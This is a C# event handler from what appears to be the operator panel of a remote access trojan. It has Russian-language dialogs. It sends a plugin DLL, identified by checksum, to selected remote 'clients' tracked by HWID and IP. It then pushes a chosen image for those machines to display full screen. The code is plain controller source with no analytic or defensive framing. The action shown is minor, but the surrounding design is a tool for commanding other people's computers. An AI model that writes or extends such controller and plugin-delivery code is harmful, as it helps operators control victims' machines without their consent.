	private void fullImageOpenToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string pluginPath = Path.Combine(Application.StartupPath, "Plugin", "FullImageOpen.dll");
		if (!File.Exists(pluginPath))
		{
			return;
		}
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Title = "Выберите изображение";
		openFileDialog.Filter = "Изображения|*.jpg;*.jpeg;*.png;*.bmp;*.gif;*.ico;*.tiff;*.webp|Все файлы|*.*";
		openFileDialog.FilterIndex = 1;
		openFileDialog.RestoreDirectory = true;
		openFileDialog.Multiselect = false;
		openFileDialog.CheckFileExists = true;
		openFileDialog.CheckPathExists = true;
		if (openFileDialog.ShowDialog() != DialogResult.OK || string.IsNullOrEmpty(openFileDialog.FileName))
		{
			return;
		}
		try
		{
			byte[] imageData = File.ReadAllBytes(openFileDialog.FileName);
			string checksum = Methods.GetChecksum(pluginPath);
			Clients[] array = ClientsSelected();
			foreach (Clients clients in array)
			{
				string hwid = clients.Hwid;
				System.Threading.Tasks.Task.Run(delegate
				{
					Methods.AppendLogs(clients.IP, "Send plugin: Plugin\\FullImageOpen.dll", Color.Blue);
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
					Clients clients2 = null;
					for (int j = 0; j < 10; j++)
					{
						Thread.Sleep(500);
						clients2 = HandlerFullImageOpen.GetPluginClient(hwid);
						if (clients2 != null && clients2.itsConnect)
						{
							break;
						}
					}
					if (clients2 != null && clients2.itsConnect)
					{
						byte[] data = LEB128.Write(new object[2] { "ShowImage", imageData });
						clients2.Send(data);
					}
				});
			}
		}
		catch (Exception ex)
		{
			Methods.AppendLogs("Error", "Error loading image: " + ex.Message, Color.Red);
			MessageBox.Show("Ошибка при загрузке изображения:\n" + ex.Message, "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

